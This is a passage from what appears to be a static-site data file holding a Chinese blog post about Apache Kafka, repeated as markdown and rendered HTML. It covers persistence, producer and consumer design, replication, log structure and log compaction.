writes`的读取速度为100k/sec，正因为现在操作系统通常采用随机存储的方式，导致人们对磁盘速度产生了错觉。\n\n`持久化策略`\n当我们保持消息队列的时候，快用完内存空间时，并不采用操作系统的策略(尽可能保持内存中的数据，将不常用的数据块替换出去)，而是将内存中的消息全部冲洗到文件系统中。个人理解Kafka能够高吞吐的原因在于`Batching`、`larger network packets`、`larger sequential disk operations`、`contiguous memory block`，所有的策略都为了保证Kafka将随机消息写转为线性写。\n<!--more-->\n> 个人翻译能力有限，留下英文原文\n\n> This suggests a design which is very simple: rather than maintain as much as possible in-memory and flush it all out to the filesystem in a panic when we run out of space, we invert that. All data is immediately written to a persistent log on the filesystem without necessarily flushing to disk. In effect this just means that it is transferred into the kernel's pagecache.\n\n此外Kafka集群保留所有publish的数据，无论这些消息有没有被消费。比如，保留策略为两天，那么两天之内，消息仍然在磁盘上，两天后为了腾出空间，就将数据移除。这样的好处在于，如果有多个消费者不会影响Kafka消息，也不会影响其他消费者。\n\n## Producer\n`负载均衡` : 生产者直接将数据发送给一个分区的`leader broker`, 它没有介入路由层。客户端控制它将消息发布到哪个分区。这可以随机完成，实现一种随机负载平衡，或者可以通过某种语义分区功能完成。Kafka公开了用于语义分区的接口，方法是允许用户指定要分区的密钥并使用它来hash分区（如果需要，还可以选择覆盖分区函数）。例如，如果选择的密钥是用户ID，则给定用户的所有数据都将被发送到同一分区。这反过来将允许消费者对他们的消费做出局部性假设。这种分区风格方便了那些对用户消息所在分区有严格要求的情况。\n`异步发送` : 批次是效率的重要推动力之一，为了实现批量生产，Kafka producer将尝试在内存中积累数据，并在单个请求中发送更大批次的数据。批处理可以配置消息积累大小，并且不超过某个固定的延迟限制（比如64k或10ms）。这允许发送积累好的大块消息，并且在服务器上只进行几次较大的 I/O 操作。这种缓冲是可配置的，并提供了一种机制来折中少量额外的延迟以获得更好的吞吐量\n\n`Message delivery semantics` : 0.11.0.0版本之前，如果`Producer`没有收到代表消息已经提交的响应，那么`Producer`只有重新发送消息，这样有个问题：在消息重发期间，上一次发送的消息已经提交成功，那么同一块消息可能被重复写入log。从0.11.0.0版本开始Kafka提供了一个选项保证消息不会被重复，`broker`分配给每个`Producer`一个ID，使用`Producer`发送来的序列码(每个消息都有一个序列码)删除重复的消息。另外从0.11.0.0开始`Producer`支持发送消息给多个`topic`分区，使用的是像合约一样的语义。\n> 翻译能力有限，留下英文原文\n\n> Also beginning with 0.11.0.0, the producer supports the ability to send messages to multiple topic partitions using transaction-like semantics: i.e. either all messages are successfully written or none of them are.\n\n上述说讲的是如何保证消息提交，但不是所有的用例都需要这样强力的保证，对于延时敏感的用例，我们允许`Producer`指定其耐心等待程度，它可以是10ms量级的等待，甚至是完全的异步。\n\n## Consumer\nKafka消费者通过向希望消费的分区的`leader`发出“获取”请求而工作。消费者在消费请求中会指定日志`offset`，然后接收`offset`之后的一大块数据`a chunk of log`，因此，消费者对这个位置具有重要的控制权，并且可以倒带它以在需要时重新消费数据。由于`offset`的控制权在消费者手里，所以理论上，消费者是可以按照自己想要的方式去消费消息，比如`reset to an older offset to reprocess data from the past`、`skip ahead to the most recent record and start consuming from \"now\"`。\n\n每个消费者都有一个自己的消费组名称标示，每一个发布到topic上的消息会被投递到每个订阅了此topic的消费者组的某一个消费者（译者注：每组都会投递，但每组都只会投递一份到某个消费者）。这个被选中的消费者实例可以在不同的处理程序中或者不同的机器之上。\n\n如果所有的消费者实例都有相同的消费组标示(consumer group),那么整个结构就是一个传统的消息队列模式，消费者之间负载均衡。\n如果所有的消费者实例都采用不同的消费组，那么真个结构就是订阅模式，每一个消息将被广播给每一个消费者。\n\n`Push还是Pull` : 最开始考虑的问题是消费值主动从`brokers` `pull`数据还是`brokers` `push`数据给消费者。Kafka采用了非常传统的设计，生产者`push`数据给`brokers`然后消费者从`brokers` `pull`数据。在其他的 logging-centric systems, such as Scribe and Apache Flume 中采用的是将数据推送给下游的方式。\n\n它们各有优缺点。然而，`push-bases`的系统难以处理不同的消费者，因为`brokers`控制着数据传输的速度，我们的目标通常是消费者能够以最大可能的速度消费。不幸的是`push-based`当消费率低于生产速度时，消费者往往会不知所措。`pull-based system`有个很舒服的属性，消费者只需要简单地`falls behind`并尽可能的跟上生产者速率。还有一个优点是它适用于发送给消费者的大量批量数据。`push-based`必须发送一个请求给下游，同时积累数据然后发送数据给消费者，但它并不知道下游是否有能力处理这些数据。\n\n`pull-based`的缺陷在于当`brokers`没有消息可以消费时，消费者就陷入轮询的`tight loop`。为了规避这个问题，Kafka在pull请求里面带有参数允许消费者请求阻塞在`long poll`直到数据到达(同时可选项是等到给定大小的数据时再消费以保证大块传输减少网络延时)\n\n## 备份\nKafka为Topic的每个Partition日志进行备份，备份数量可以由用户进行配置。这保证了系统的自动容错，如果有服务器宕机，消息可以从剩余的服务器中读取。备份的单位是Topic的分区。在没有发生异常的情况下，Kafka中每个分区都会有一个Leader和0或多个Follower。备份包含Leader在内（也就是说如果备份数为3，那么有一个Leader Partition和两个Follower Partition）。所有的读写请求都落在Leader Partition上。通常情况下分区要比Broker多，Leader分区分布在Broker上。Follower上的日志和Leader上的日志相同，拥有相同的偏移量和消息顺序（当然，在特定时间内，Leader上日志会有一部分数据还没复制到Follower上）。\n\nFollower作为普通的Consumer消费Leader上的日志，并应用到自己的日志中。Leader允许Follower自然的，成批的从服务端获取日志并应用到自己的日志中。大部分分布式系统都需要自动处理故障，需要对节点“alive”进行精确的定义。例如在Kafka中，节点存活需要满足两个条件：\n- 节点需要保持它和ZooKeeper之间的Session（通过ZK的心跳机制）\n- 如果是Follower，需要复制Leader上的写事件，并且复制进度没有“落后太多”\n\n一条消息在被应用到所有的备份上之后被认为是“已经提交的”。只有提交了的消息会被Consumer消费。这意味着Consumer不需要担心Leader节点宕机后消息会丢失。另一方面，Producer可以配置是否等待消息被提交，这取决于他们在延迟和可用性上的权衡。这个可以通过Producer的配置项中设置。Kafka提供了一条消息被提交之后，只要还有一个备份可用，消息就不会丢失的保证\n\n## 日志\n包含两个partition，名称为“my_topic”的Topic的日志包含两个目录（名称为my_topic_0和my_topic_1）,其中包含该Topic的消息的数据文件。日志文件的格式是log entry的序列；每个log entry都是4字节的消息长度N加上后面N个字节的消息数据。每条消息都有一个64位的offset标识这条消息在这个Topic的Partition中的偏移量。消息在磁盘中的存储格式如下所示。每个日志文件都以它存储的第一条消息的offset命名。所以第一个文件会命名为00000000000.kafka，随后每个文件的文件名将是前一个文件的文件名加上S的正数，S是配置中指定的单个文件的大小\n\n使用消息的Offset作为消息ID是不常见的。我们初始的想法是在Producer生成一个GUID作为Message ID，并在Broker上维持ID和Offset之间的映射关系。但是因为Consumer需要为每个Server维持一个ID，那么GUID的全局唯一性就变得没什么意义了。此外，维持一个随机的ID和Offset的映射关系将给索引的构建带来巨大的负担，本质上需要一个完整的持久化的随机存取的数据结构。因此，为了简化查找结构，我们决定使用每个分区的原子计数器，它可以和分区ID加上ServerID来唯一标识一条消息。一旦使用了计数器，直接使用Offset进行跳转是顺其自然的，两者都是分区内单调递增的整数。由于偏移量从消费者API中隐藏起来，因此这个决定是最终的实现细节，所以我们采用更有效的方法。\n\n### Writes\n日志允许连续追加到最后一个文件。当文件达到配置的大小时（如1GB）将滚动到一个新文件。日志采用两个配置：M，配置达到多少条消息后进行刷盘；S，配置多长时间之后进行刷盘。这个持久化策略保证最多只丢失M条消息或者S秒之内的消息。\n\n### Reads\n读取通过提供64位的offset和S-byte的chunk大小来实现。这将返回包含在S-byte的buffer的消息迭代。S比任意单条消息都大，但是如果在异常的超大消息的情况下，读取操作可以通过多次重试，每次都将buffer大小翻倍，直到消息被读取成功。最大消息大小和buffer大小可以配置，用于拒绝超过特定大小的消息，以限制客户端读取消息时需要拓展的buffer大小。buffer可能以不完整的消息作为结尾，这可以通过消息大小来轻松的检测到。\n实际的读取操作首先需要定位offset所在的文件，再将offset转化为文件内相对的偏移量，然后从文件的这个偏移量开始读取数据。搜索操作通过内存中映射的文件的简单的二分查找完成。\n日志提供了获取最近写入消息的能力以允许客户端从“当前时间”开始订阅。这在客户端无法在指定天数内消费掉消息的场景中非常有用。在这种情况下，如果客户端尝试消费一个不存在的offset将抛出OutOfRangeException异常并且可以根据场景重置或者失败\n\n### Deletes\n数据删除一次删除一个日志段。日志管理器允许通过插件的形式实现删除策略来选择那些文件是合适删除的。当前的删除策略是日志文件的修改时间已经过去N天，保留最近N GB数据的策略也是有用的。为了避免删除时锁定读取操作，我们采用copy-on-write的方式来实现，以保证一致性的视图。\n\n## 日志压缩\n日志压缩确保Kafka会为一个Topic分区数据日志中保留至少message key的最后一个值。在持久化那部分我们已经说明了在一断时间或达到特定大小的时候丢弃旧日志的简单方法。这适用于像日志这样每一条数据都是独立数据的情况。但是重要类别的数据是根据key处理的数据（例如DB中表的变更数据）。\n\n让我们来讨论这样一个具体的流的例子。一个Topic包含了用户email address信息；每一次用户变更邮箱地址，我们都向这个topic发送一条消息，使用用户ID作为primay key。现在我们已经为用户ID为123的用户发送了一些消息，每条消息包含了email address的变更:\n```\n123 => bill@microsoft.com\n        .\n        .\n        .\n123 => bill@gatesfoundation.org\n        .\n        .\n        .\n123 => bill@gmail.com\n```\n日志压缩为我们提供了更精细的保留机制，至少保存每个key最后一个变更（如123 => bill@gmail.com）。这样做我们确保了这个日志包含了所有key最后一个值的快照。这样Consumer可以重建状态而不需要保留完成的变更日志。\n\n假设我们有无限的日志，记录每次变更日志，我们从一开始就捕获每一次变更。使用这个完整的日志，我们可以通过回放日志来恢复到任何一个时间点的状态。这种假设的情况下，完整的日志是不实际的，对于那些每一行记录会变更多次的系统，即使数据集很小，日志也会无限的增长下去。丢弃旧日志的简单操作可以限制空间的增长，但是无法重建状态——因为旧的日志被丢弃，可能一部分记录的状态会无法重建（这写记录所有的状态变更都在就日志中）。\n\n日志压缩机制是更细粒度的，每个记录都保留的机制，而不是基于时间的粗粒度。这个想法是选择性的删除哪些有更新的变更的记录的日志。这样最终日志至少包含每个key的记录的最后一个状态。压缩操作通过在后台周期性的拷贝日志段来完成。清除操作不会阻塞读取，并且可以被配置不超过一定IO吞吐来避免影响Producer和Consumer。\n\n**补上几张图片**\n![](http://kafka.apache.org/11/images/log_cleaner_anatomy.png)\n\n![](http://kafka.apache.org/11/images/log_compaction.png)\n\n## 参考链接\n- [https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html](https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html)\n- [http://kafka.apache.org/intro](http://kafka.apache.org/intro)\n- [http://kafka.apache.org/documentation/](http://kafka.apache.org/documentation/)\n- [备份](https://www.jianshu.com/p/7833e958fd0c)\n- [日志压缩](https://www.jianshu.com/p/7abe0b0727fb)\n- [日志](https://www.jianshu.com/p/d41935106b52)","source":"_posts/Kafka.md","raw":"---\ntitle: Kafka 简述\ndate: 2018-04-02 15:18:23\ncategories: 分布式计算\ntags:\n  - Kafka\n  - 持久化\n  - 备份\n  - 日志压缩\n---\n\n## 持久化\n`Don.t fear the filesystem`\nKafka非常依赖文件系统来存储和缓存消息，但人们在这里总是有一个错觉`disks are slow`。事实上，`disks`可以很慢，也可以很快，这取决于人们怎么用它，一个设计合理的磁盘结构通常可以和网络一样快。\n\n这里有一个事实：磁盘读取快慢主要取决于寻道延时。`six 7200rpm SATA RAID-5 array`的磁盘`linear writes`的读取速度大概为600MB/sec，但`random writes`的读取速度为100k/sec，正因为现在操作系统通常采用随机存储的方式，导致人们对磁盘速度产生了错觉。\n\n`持久化策略`\n当我们保持消息队列的时候，快用完内存空间时，并不采用操作系统的策略(尽可能保持内存中的数据，将不常用的数据块替换出去)，而是将内存中的消息全部冲洗到文件系统中。个人理解Kafka能够高吞吐的原因在于`Batching`、`larger network packets`、`larger sequential disk operations`、`contiguous memory block`，所有的策略都为了保证Kafka将随机消息写转为线性写。\n<!--more-->\n> 个人翻译能力有限，留下英文原文\n\n> This suggests a design which is very simple: rather than maintain as much as possible in-memory and flush it all out to the filesystem in a panic when we run out of space, we invert that. All data is immediately written to a persistent log on the filesystem without necessarily flushing to disk. In effect this just means that it is transferred into the kernel's pagecache.\n\n此外Kafka集群保留所有publish的数据，无论这些消息有没有被消费。比如，保留策略为两天，那么两天之内，消息仍然在磁盘上，两天后为了腾出空间，就将数据移除。这样的好处在于，如果有多个消费者不会影响Kafka消息，也不会影响其他消费者。\n\n## Producer\n`负载均衡` : 生产者直接将数据发送给一个分区的`leader broker`, 它没有介入路由层。客户端控制它将消息发布到哪个分区。这可以随机完成，实现一种随机负载平衡，或者可以通过某种语义分区功能完成。Kafka公开了用于语义分区的接口，方法是允许用户指定要分区的密钥并使用它来hash分区（如果需要，还可以选择覆盖分区函数）。例如，如果选择的密钥是用户ID，则给定用户的所有数据都将被发送到同一分区。这反过来将允许消费者对他们的消费做出局部性假设。这种分区风格方便了那些对用户消息所在分区有严格要求的情况。\n`异步发送` : 批次是效率的重要推动力之一，为了实现批量生产，Kafka producer将尝试在内存中积累数据，并在单个请求中发送更大批次的数据。批处理可以配置消息积累大小，并且不超过某个固定的延迟限制（比如64k或10ms）。这允许发送积累好的大块消息，并且在服务器上只进行几次较大的 I/O 操作。这种缓冲是可配置的，并提供了一种机制来折中少量额外的延迟以获得更好的吞吐量\n\n`Message delivery semantics` : 0.11.0.0版本之前，如果`Producer`没有收到代表消息已经提交的响应，那么`Producer`只有重新发送消息，这样有个问题：在消息重发期间，上一次发送的消息已经提交成功，那么同一块消息可能被重复写入log。从0.11.0.0版本开始Kafka提供了一个选项保证消息不会被重复，`broker`分配给每个`Producer`一个ID，使用`Producer`发送来的序列码(每个消息都有一个序列码)删除重复的消息。另外从0.11.0.0开始`Producer`支持发送消息给多个`topic`分区，使用的是像合约一样的语义。\n> 翻译能力有限，留下英文原文\n\n> Also beginning with 0.11.0.0, the producer supports the ability to send messages to multiple topic partitions using transaction-like semantics: i.e. either all messages are successfully written or none of them are.\n\n上述说讲的是如何保证消息提交，但不是所有的用例都需要这样强力的保证，对于延时敏感的用例，我们允许`Producer`指定其耐心等待程度，它可以是10ms量级的等待，甚至是完全的异步。\n\n## Consumer\nKafka消费者通过向希望消费的分区的`leader`发出“获取”请求而工作。消费者在消费请求中会指定日志`offset`，然后接收`offset`之后的一大块数据`a chunk of log`，因此，消费者对这个位置具有重要的控制权，并且可以倒带它以在需要时重新消费数据。由于`offset`的控制权在消费者手里，所以理论上，消费者是可以按照自己想要的方式去消费消息，比如`reset to an older offset to reprocess data from the past`、`skip ahead to the most recent record and start consuming from \"now\"`。\n\n每个消费者都有一个自己的消费组名称标示，每一个发布到topic上的消息会被投递到每个订阅了此topic的消费者组的某一个消费者（译者注：每组都会投递，但每组都只会投递一份到某个消费者）。这个被选中的消费者实例可以在不同的处理程序中或者不同的机器之上。\n\n如果所有的消费者实例都有相同的消费组标示(consumer group),那么整个结构就是一个传统的消息队列模式，消费者之间负载均衡。\n如果所有的消费者实例都采用不同的消费组，那么真个结构就是订阅模式，每一个消息将被广播给每一个消费者。\n\n`Push还是Pull` : 最开始考虑的问题是消费值主动从`brokers` `pull`数据还是`brokers` `push`数据给消费者。Kafka采用了非常传统的设计，生产者`push`数据给`brokers`然后消费者从`brokers` `pull`数据。在其他的 logging-centric systems, such as Scribe and Apache Flume 中采用的是将数据推送给下游的方式。\n\n它们各有优缺点。然而，`push-bases`的系统难以处理不同的消费者，因为`brokers`控制着数据传输的速度，我们的目标通常是消费者能够以最大可能的速度消费。不幸的是`push-based`当消费率低于生产速度时，消费者往往会不知所措。`pull-based system`有个很舒服的属性，消费者只需要简单地`falls behind`并尽可能的跟上生产者速率。还有一个优点是它适用于发送给消费者的大量批量数据。`push-based`必须发送一个请求给下游，同时积累数据然后发送数据给消费者，但它并不知道下游是否有能力处理这些数据。\n\n`pull-based`的缺陷在于当`brokers`没有消息可以消费时，消费者就陷入轮询的`tight loop`。为了规避这个问题，Kafka在pull请求里面带有参数允许消费者请求阻塞在`long poll`直到数据到达(同时可选项是等到给定大小的数据时再消费以保证大块传输减少网络延时)\n\n## 备份\nKafka为Topic的每个Partition日志进行备份，备份数量可以由用户进行配置。这保证了系统的自动容错，如果有服务器宕机，消息可以从剩余的服务器中读取。备份的单位是Topic的分区。在没有发生异常的情况下，Kafka中每个分区都会有一个Leader和0或多个Follower。备份包含Leader在内（也就是说如果备份数为3，那么有一个Leader Partition和两个Follower Partition）。所有的读写请求都落在Leader Partition上。通常情况下分区要比Broker多，Leader分区分布在Broker上。Follower上的日志和Leader上的日志相同，拥有相同的偏移量和消息顺序（当然，在特定时间内，Leader上日志会有一部分数据还没复制到Follower上）。\n\nFollower作为普通的Consumer消费Leader上的日志，并应用到自己的日志中。Leader允许Follower自然的，成批的从服务端获取日志并应用到自己的日志中。大部分分布式系统都需要自动处理故障，需要对节点“alive”进行精确的定义。例如在Kafka中，节点存活需要满足两个条件：\n- 节点需要保持它和ZooKeeper之间的Session（通过ZK的心跳机制）\n- 如果是Follower，需要复制Leader上的写事件，并且复制进度没有“落后太多”\n\n一条消息在被应用到所有的备份上之后被认为是“已经提交的”。只有提交了的消息会被Consumer消费。这意味着Consumer不需要担心Leader节点宕机后消息会丢失。另一方面，Producer可以配置是否等待消息被提交，这取决于他们在延迟和可用性上的权衡。这个可以通过Producer的配置项中设置。Kafka提供了一条消息被提交之后，只要还有一个备份可用，消息就不会丢失的保证\n\n## 日志\n包含两个partition，名称为“my_topic”的Topic的日志包含两个目录（名称为my_topic_0和my_topic_1）,其中包含该Topic的消息的数据文件。日志文件的格式是log entry的序列；每个log entry都是4字节的消息长度N加上后面N个字节的消息数据。每条消息都有一个64位的offset标识这条消息在这个Topic的Partition中的偏移量。消息在磁盘中的存储格式如下所示。每个日志文件都以它存储的第一条消息的offset命名。所以第一个文件会命名为00000000000.kafka，随后每个文件的文件名将是前一个文件的文件名加上S的正数，S是配置中指定的单个文件的大小\n\n使用消息的Offset作为消息ID是不常见的。我们初始的想法是在Producer生成一个GUID作为Message ID，并在Broker上维持ID和Offset之间的映射关系。但是因为Consumer需要为每个Server维持一个ID，那么GUID的全局唯一性就变得没什么意义了。此外，维持一个随机的ID和Offset的映射关系将给索引的构建带来巨大的负担，本质上需要一个完整的持久化的随机存取的数据结构。因此，为了简化查找结构，我们决定使用每个分区的原子计数器，它可以和分区ID加上ServerID来唯一标识一条消息。一旦使用了计数器，直接使用Offset进行跳转是顺其自然的，两者都是分区内单调递增的整数。由于偏移量从消费者API中隐藏起来，因此这个决定是最终的实现细节，所以我们采用更有效的方法。\n\n### Writes\n日志允许连续追加到最后一个文件。当文件达到配置的大小时（如1GB）将滚动到一个新文件。日志采用两个配置：M，配置达到多少条消息后进行刷盘；S，配置多长时间之后进行刷盘。这个持久化策略保证最多只丢失M条消息或者S秒之内的消息。\n\n### Reads\n读取通过提供64位的offset和S-byte的chunk大小来实现。这将返回包含在S-byte的buffer的消息迭代。S比任意单条消息都大，但是如果在异常的超大消息的情况下，读取操作可以通过多次重试，每次都将buffer大小翻倍，直到消息被读取成功。最大消息大小和buffer大小可以配置，用于拒绝超过特定大小的消息，以限制客户端读取消息时需要拓展的buffer大小。buffer可能以不完整的消息作为结尾，这可以通过消息大小来轻松的检测到。\n实际的读取操作首先需要定位offset所在的文件，再将offset转化为文件内相对的偏移量，然后从文件的这个偏移量开始读取数据。搜索操作通过内存中映射的文件的简单的二分查找完成。\n日志提供了获取最近写入消息的能力以允许客户端从“当前时间”开始订阅。这在客户端无法在指定天数内消费掉消息的场景中非常有用。在这种情况下，如果客户端尝试消费一个不存在的offset将抛出OutOfRangeException异常并且可以根据场景重置或者失败\n\n### Deletes\n数据删除一次删除一个日志段。日志管理器允许通过插件的形式实现删除策略来选择那些文件是合适删除的。当前的删除策略是日志文件的修改时间已经过去N天，保留最近N GB数据的策略也是有用的。为了避免删除时锁定读取操作，我们采用copy-on-write的方式来实现，以保证一致性的视图。\n\n## 日志压缩\n日志压缩确保Kafka会为一个Topic分区数据日志中保留至少message key的最后一个值。在持久化那部分我们已经说明了在一断时间或达到特定大小的时候丢弃旧日志的简单方法。这适用于像日志这样每一条数据都是独立数据的情况。但是重要类别的数据是根据key处理的数据（例如DB中表的变更数据）。\n\n让我们来讨论这样一个具体的流的例子。一个Topic包含了用户email address信息；每一次用户变更邮箱地址，我们都向这个topic发送一条消息，使用用户ID作为primay key。现在我们已经为用户ID为123的用户发送了一些消息，每条消息包含了email address的变更:\n```\n123 => bill@microsoft.com\n        .\n        .\n        .\n123 => bill@gatesfoundation.org\n        .\n        .\n        .\n123 => bill@gmail.com\n```\n日志压缩为我们提供了更精细的保留机制，至少保存每个key最后一个变更（如123 => bill@gmail.com）。这样做我们确保了这个日志包含了所有key最后一个值的快照。这样Consumer可以重建状态而不需要保留完成的变更日志。\n\n假设我们有无限的日志，记录每次变更日志，我们从一开始就捕获每一次变更。使用这个完整的日志，我们可以通过回放日志来恢复到任何一个时间点的状态。这种假设的情况下，完整的日志是不实际的，对于那些每一行记录会变更多次的系统，即使数据集很小，日志也会无限的增长下去。丢弃旧日志的简单操作可以限制空间的增长，但是无法重建状态——因为旧的日志被丢弃，可能一部分记录的状态会无法重建（这写记录所有的状态变更都在就日志中）。\n\n日志压缩机制是更细粒度的，每个记录都保留的机制，而不是基于时间的粗粒度。这个想法是选择性的删除哪些有更新的变更的记录的日志。这样最终日志至少包含每个key的记录的最后一个状态。压缩操作通过在后台周期性的拷贝日志段来完成。清除操作不会阻塞读取，并且可以被配置不超过一定IO吞吐来避免影响Producer和Consumer。\n\n**补上几张图片**\n![](http://kafka.apache.org/11/images/log_cleaner_anatomy.png)\n\n![](http://kafka.apache.org/11/images/log_compaction.png)\n\n## 参考链接\n- [https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html](https://kafkadoc.beanmr.com/010_getting_started/01_introduction_cn.html)\n- [http://kafka.apache.org/intro](http://kafka.apache.org/intro)\n- [http://kafka.apache.org/documentation/](http://kafka.apache.org/documentation/)\n- [备份](https://www.jianshu.com/p/7833e958fd0c)\n- [日志压缩](https://www.jianshu.com/p/7abe0b0727fb)\n- [日志](https://www.jianshu.com/p/d41935106b52)","slug":"Kafka","published":1,"updated":"2018-04-07T08:23:09.472Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxm000qyp0lvuw6uppn","content":"<h2 id=\"持久化\"><a href=\"#持久化\" class=\"headerlink\" title=\"持久化\"></a>持久化</h2><p><code>Don.t fear the filesystem</code><br>Kafka非常依赖文件系统来存储和缓存消息，但人们在这里总是有一个错觉<code>disks are slow</code>。事实上，<code>disks</code>可以很慢，也可以很快，这取决于人们怎么用它，一个设计合理的磁盘结构通常可以和网络一样快。</p>\n<p>这里有一个事实：磁盘读取快慢主要取决于寻道延时。<code>six 7200rpm SATA RAID-5 array</code>的磁盘<code>linear writes</code>的读取速度大概为600MB/sec，但<code>random writes</code>的读取速度为100k/sec，正因为现在操作系统通常采用随机存储的方式，导致人们对磁盘速度产生了错觉。</p>\n<p><code>持久化策略</code><br>当我们保持消息队列的时候，快用完内存空间时，并不采用操作系统的策略(尽可能保持内存中的数据，将不常用的数据块替换出去)，而是将内存中的消息全部冲洗到文件系统中。个人理解Kafka能够高吞吐的原因在于<code>Batching</code>、<code>larger network packets</code>、<code>larger sequential disk operations</code>、<code>contiguous memory block</code>，所有的策略都为了保证Kafka将随机消息写转为线性写。<br><a id=\"more\"></a></p>\n<blockquote>\n<p>个人翻译能力有限，留下英文原文</p>\n<p>This suggests a design which is very simple: rather than maintain as much as possible in-memory and flush it all out to the filesystem in a panic when we run out of space, we invert that. All data is immediately written to a persistent log on the filesystem without necessarily flushing to disk. In effect this just means that it is transferred into the kernel’s pagecache.</p>\n</blockquote>\n<p>此外Kafka集群保留所有publish的数据，无论这些消息有没有被消费。比如，保留策略为两天，那么两天之内，消息仍然在磁盘上，两天后为了腾出空间，就将数据移除。这样的好处在于，如果有多个消费者不会影响Kafka消息，也不会影响其他消费者。</p>\n<h2 id=\"Producer\"><a href=\"#Producer\" class=\"headerlink\" title=\"Producer\"></a>Producer</h2><p><code>负载均衡</code> : 生产者直接将数据发送给一个分区的<code>leader broker</code>, 它没有介入路由层。客户端控制它将消息发布到哪个分区。这可以随机完成，实现一种随机负载平衡，或者可以通过某种语义分区功能完成。Kafka公开了用于语义分区的接口，方法是允许用户指定要分区的密钥并使用它来hash分区（如果需要，还可以选择覆盖分区函数）。例如，如果选择的密钥是用户ID，则给定用户的所有数据都将被发送到同一分区。这反过来将允许消费者对他们的消费做出局部性假设。这种分区风格方便了那些对用户消息所在分区有严格要求的情况。<br><code>异步发送</code> : 批次是效率的重要推动力之一，为了实现批量生产，Kafka producer将尝试在内存中积累数据，并在单个请求中发送更大批次的数据。批处理可以配置消息积累大小，并且不超过某个固定的延迟限制（比如64k或10ms）。这允许发送积累好的大块消息，并且在服务器上只进行几次较大的 I/O 操作。这种缓冲是可配置的，并提供了一种机制来折中少量额外的延迟以获得更好的吞吐量</p>\n<p><code>Message delivery semantics</code> : 0.11.0.0版本之前，如果<code>Producer</code>没有收到代表消息已经提交的响应，那么<code>Producer</code>只有重新发送消息，这样有个问题：在消息重发期间，上一次发送的消息已经提交成功，那么同一块消息可能被重复写入log。从0.11.0.0版本开始Kafka提供了一个选项保证消息不会被重复，<code>broker</code>分配给每个<code>Producer</code>一个ID，使用<code>Producer</code>发送来的序列码(每个消息都有一个序列码)删除重复的消息。另外从0.11.0.0开始<code>Producer</code>支持发送消息给多个<code>topic</code>分区，使用的是像合约一样的语义。</p>\n<blockquote>\n<p>翻译能力有限，留下英文原文</p>\n<p>Also beginning with 0.11.0.0, the producer supports the ability to send messages to multiple topic partitions using transaction-like semantics: i.e. either all messages are successfully written or none of them are.</p>\n</blockquote>\n<p>上述说讲的是如何保证消息提交，但不是所有的用例都需要这样强力的保证，对于延时敏感的用例，我们允许<code>Producer</code>指定其耐心等待程度，它可以是10ms量级的等待，甚至是完全的异步。</p>\n<h2 id=\"Consumer\"><a href=\"#Consumer\" class=\"headerlink\" title=\"Consumer\"></a>Consumer</h2><p>Kafka消费者通过向希望消费的分区的<code>leader</code>发出“获取”请求而工作。消费者在消费请求中会指定日志<code>offset</code>，然后接收<code>offset</code>之后的一大块数据<code>a chunk of log</code>，因此，消费者对这个位置具有重要的控制权，并且可以倒带它以在需要时重新消费数据。由于<code>offset</code>的控制权在消费者手里，所以理论上，消费者是可以按照自己想要的方式去消费消息，比如<code>reset to an older offset to reprocess data from the past</code>、<code>skip ahead to the most recent record and start consuming from &quot;now&quot;</code>。</p>\n<p>每个消费者都有一个自己的消费组名称标示，每一个发布到topic上的消息会被投递到每个订阅了此topic的消费者组的某一个消费者（译者注：每组都会投递，但每组都只会投递一份到某个消费者）。这个被选中的消费者实例可以在不同的处理程序中或者不同的机器之上。</p>\n<p>如果所有的消费者实例都有相同的消费组标示(consumer group),那么整个结构就是一个传统的消息队列模式，消费者之间负载均衡。<br>如果所有的消费者实例都采用不同的消费组，那么真个结构就是订阅模式，每一个消息将被广播给每一个消费者。</p>\n<p><code>Push还是Pull</code> : 最开始考虑的问题是消费值主动从<code>brokers</code> <code>pull</code>数据还是<code>brokers</code> <code>push</code>数据给消费者。Kafka采用了非常传统的设计，生产者<code>push</code>数据给<code>brokers</code>然后消费者从<code>brokers</code> <code>pull</code>数据。在其他的 logging-centric systems, such as Scribe and Apache Flume 中采用的是将数据推送给下游的方式。</p>\n<p>它们各有优缺点。然而，<code>push-bases</code>的系统难以处理不同的消费者，因为<code>brokers</code>控制着数据传输的速度，我们的目标通常是消费者能够以最大可能的速度消费。不幸的是<code>push-based</code>当消费率低于生产速度时，消费者往往会不知所措。<code>pull-based system</code>有个很舒服的属性，消费者只需要简单地<code>falls behind</code>并尽可能的跟上生产者速率。还有一个优点是它适用于发送给消费者的大量批量数据。<code>push-based</code>必须发送一个请求给下游，同时积累数据然后发送数据给消费者，但它并不知道下游是否有能力处理这些数据。</p>\n<p><code>pull-based</code>的缺陷在于当<code>brokers</code>没有消息可以消费时，消费者就陷入轮询的<code>tight loop</code>。为了规避这个问题，Kafka在pull请求里面带有参数允许消费者请求阻塞在<code>long poll</code>直到数据到达(同时可选项是等到给定大小的数据时再消费以保证大块传输减少网络延时)</p>\n<h2 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h2><p>Kafka为Topic的每个Partition日志进行备份，备份数量可以由用户进行配置。这保证了系统的自动容错，如果有服务器宕机，消息可以从剩余的服务器中读取。备份的单位是Topic的分区。在没有发生异常的情况下，Kafka中每个分区都会有一个Leader和0或多个Follower。备份包含Leader在内（也就是说如果备份数为3，那么有一个Leader Partition和两个Follower Partition）。所有的读写请求都落在Leader Partition上。通常情况下分区要比Broker多，Leader分区分布在Broker上。Follower上的日志和Leader上的日志相同，拥有相同的偏移量和消息顺序（当然，在特定时间内，Leader上日志会有一部分数据还没复制到Follower上）。</p>\n<p>Follower作为普通的Consumer消费Leader上的日志，并应用到自己的日志中。Leader允许Follower自然的，成批的从服务端获取日志并应用到自己的日志中。大部分分布式系统都需要自动处理故障，需要对节点“alive”进行精确的定义。例如在Kafka中，节点存活需要满足两个条件：</p>\n<ul>\n<li>节点需要保持它和ZooKeeper之间的Session（通过ZK的心跳机制）</li>\n<li>如果是Follower，需要复制Leader上的写事件，并且复制进度没有“落后太多”</li>\n</ul>\n<p>一条消息在被应用到所有的备份上之后被认为是“已经提交的”。只有提交了的消息会被Consumer消费。这意味着Consumer不需要担心Leader节点宕机后消息会丢失。另一方面，Producer可以配置是否等待消息被提交，这取决于他们在延迟和可用性上的权衡。这个可以通过Producer的配置项中设置。Kafka提供了一条消息被提交之后，只要还有一个备份可用，消息就不会丢失的保证</p>\n<h2 